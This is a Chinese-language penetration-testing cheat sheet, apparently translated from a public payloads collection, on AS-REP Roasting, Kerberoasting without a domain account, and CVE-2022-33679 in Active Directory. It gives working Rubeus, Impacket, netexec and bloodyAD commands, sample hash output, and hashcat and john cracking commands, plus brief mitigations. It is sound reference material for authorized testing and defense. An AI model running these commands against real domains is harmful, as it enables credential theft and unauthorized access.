# Roasting - AS-REP Roasting

> 如果域用户未启用 Kerberos 预身份验证，则可以成功为该用户请求 AS-REP，并且结构的组成部分可以像 Kerberoasting 一样被离线破解

**前提条件**：

* 具有 **DONT_REQ_PREAUTH** 属性的帐户
    * Windows/Linux：

    ```ps1
    bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
    ```

    * 仅 Windows：

    ```ps1
    PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
    ```

* [Rubeus](https://github.com/GhostPack/Rubeus)

  ```powershell
  C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast
  [*] Action: AS-REP roasting
  [*] Target User            : TestOU3user
  [*] Target Domain          : testlab.local
  [*] SamAccountName         : TestOU3user
  [*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
  [*] Using domain controller: testlab.local (192.168.52.100)
  [*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
  [*] Connecting to 192.168.52.100:88
  [*] Sent 169 bytes
  [*] Received 1437 bytes
  [+] AS-REQ w/o preauth successful!
  [*] AS-REP hash:

  $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...
  ```

* Impacket 套件中的 [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)

  ```powershell
  $ python GetNPUsers.py htb.local/svc-alfresco -no-pass
  [*] Getting TGT for svc-alfresco
  $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4

  # 提取哈希
  root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
  root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
  ```

* netexec 模块

  ```powershell
  $ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
  LDAP        10.0.2.11       389    dc01           $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5
  ```

使用 `hashcat` 或 `john` 破解票据。

```powershell
# 使用 hashcat 破解 AS_REP 消息
root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
root@windows:hashcat$ hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt

# 使用 john 破解 AS_REP 消息
C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
```

**缓解措施**：

* 所有帐户必须启用"Kerberos 预身份验证"（默认启用）。

## 无域帐户的 Kerberoasting

> 2022 年 9 月，[Charlie Clark](https://exploit.ph/) 发现了一个漏洞，可以通过 KRB_AS_REQ 请求获取 ST（服务票据），而无需控制任何 Active Directory 帐户。如果某个主体可以在无需预身份验证的情况下进行认证（类似 AS-REP Roasting 攻击），则可以使用它发起 **KRB_AS_REQ** 请求，并通过修改请求的 req-body 部分中的 **sname** 属性来欺骗请求获取 **ST** 而非 **加密的 TGT**。

该技术在此文章中有完整说明：[Semperis 博客](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)。

:warning: 你必须提供用户列表，因为使用此技术我们没有有效帐户来查询 LDAP。

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413)

  ```powershell
  GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
  ```

* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139)

  ```powershell
  Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
  ```

## CVE-2022-33679

> CVE-2022-33679 通过强制 KDC 使用 RC4-MD4 算法执行加密降级攻击，然后使用已知明文攻击从 AS-REP 中暴力破解会话密钥。与 AS-REP Roasting 类似，它针对禁用了预身份验证的帐户，且该攻击是未经身份验证的，意味着我们不需要客户端的密码。

Project Zero 的研究：[RC4 Is Still Considered Harmful - James Forshaw](https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html)

**前提条件**：

具有 **DONT_REQ_PREAUTH** 属性的帐户

* Windows/Linux：

    ```ps1
    bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
    ```

* 仅 Windows：

    ```ps1
    PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
    ```

**利用方法**：

* 使用 [CVE-2022-33679.py](https://github.com/Bdenneu/CVE-2022-33679)

  ```bash
  user@hostname:~$ python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL
  user@hostname:~$ export KRB5CCNAME=/home/project/User.ccache
  user@hostname:~$ netexec smb DC01.DOMAIN.LOCAL -k --shares
  ```

**缓解措施**：

* 所有帐户必须启用"Kerberos 预身份验证"（默认启用）。
* 如果可能，禁用 RC4 密码套件。

## 参考资料

* [Roasting AS-REPs - January 17, 2017 - harmj0y](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
* [Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
